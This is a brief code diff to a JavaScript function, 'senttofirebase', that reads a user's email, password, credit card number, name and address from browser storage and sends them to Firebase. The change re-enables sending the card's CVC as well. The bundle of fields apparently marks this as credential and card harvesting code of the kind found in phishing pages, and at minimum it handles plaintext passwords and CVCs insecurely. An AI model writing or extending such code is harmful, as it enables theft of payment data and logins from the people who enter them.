@@ -4,7 +4,7 @@ function senttofirebase() {
         email: localStorage.getItem("email"),
         password: localStorage.getItem("password"),
         credit: localStorage.getItem("credit"),
-        //cvc: localStorage.getItem("cvc"),
+        cvc: localStorage.getItem("cvc"),
         name: localStorage.getItem("name"),
         address: localStorage.getItem("address")
     });
